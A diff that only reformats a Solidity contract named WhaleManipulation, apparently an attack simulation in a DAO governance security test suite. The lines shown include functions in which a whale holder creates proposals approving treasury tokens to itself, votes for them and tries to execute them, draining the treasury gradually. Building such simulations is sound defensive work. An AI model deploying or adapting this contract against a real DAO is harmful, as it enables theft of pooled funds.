@@ -117,11 +117,7 @@ contract WhaleManipulation {
     // Constructor
     // ─────────────────────────────────────────────────────────────────────────
 
-    constructor(
-        address _governanceToken,
-        address _governor,
-        address _targetTreasury
-    ) {
+    constructor(address _governanceToken, address _governor, address _targetTreasury) {
         require(_governanceToken != address(0), "Invalid token");
         require(_governor != address(0), "Invalid governor");
         require(_targetTreasury != address(0), "Invalid treasury");
@@ -142,10 +138,7 @@ contract WhaleManipulation {
      * @param whale The address of the whale holder
      * @param treasuryDrainAmount The amount to attempt stealing from treasury
      */
-    function executeWhaleAttack(
-        address whale,
-        uint256 treasuryDrainAmount
-    ) external returns (bool) {
+    function executeWhaleAttack(address whale, uint256 treasuryDrainAmount) external returns (bool) {
         require(whale != address(0), "Invalid whale address");
         require(treasuryDrainAmount > 0, "Invalid drain amount");
 
@@ -184,10 +177,7 @@ contract WhaleManipulation {
     /**
      * @notice Internal function to perform the whale attack
      */
-    function _performWhaleAttack(
-        address whale,
-        uint256 treasuryDrainAmount
-    ) external returns (bool) {
+    function _performWhaleAttack(address whale, uint256 treasuryDrainAmount) external returns (bool) {
         require(msg.sender == address(this), "Only internal call allowed");
 
         // Create a proposal: Treasury transfer to whale
@@ -245,11 +235,10 @@ contract WhaleManipulation {
      * @param numberOfProposals How many proposals to create
      * @param amountPerProposal Amount to drain in each proposal
      */
-    function executeGradualDraining(
-        address whale,
-        uint256 numberOfProposals,
-        uint256 amountPerProposal
-    ) external returns (uint256 totalDrained) {
+    function executeGradualDraining(address whale, uint256 numberOfProposals, uint256 amountPerProposal)
+        external
+        returns (uint256 totalDrained)
+    {
         require(numberOfProposals > 0, "Must create at least 1 proposal");
         require(amountPerProposal > 0, "Amount per proposal must be > 0");
 
@@ -267,21 +256,13 @@ contract WhaleManipulation {
             values[0] = 0;
 
             bytes[] memory calldatas = new bytes[](1);
-            calldatas[0] = abi.encodeWithSignature(
-                "approve(address,uint256)",
-                whale,
-                amountPerProposal
-            );
+            calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", whale, amountPerProposal);
 
-            string memory description = string(
-                abi.encodePacked("PROPOSAL: Whale Allocation Round ", _uint2str(i + 1))
-            );
+            string memory description = string(abi.encodePacked("PROPOSAL: Whale Allocation Round ", _uint2str(i + 1)));
 
             bytes32 descriptionHash = keccak256(abi.encodePacked(description));
 
-            try IGovernor(governor).propose(targets, values, calldatas, description) returns (
-                uint256 proposalId
-            ) {
+            try IGovernor(governor).propose(targets, values, calldatas, description) returns (uint256 proposalId) {
                 // Vote for the proposal
                 try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
                     // Try to execute
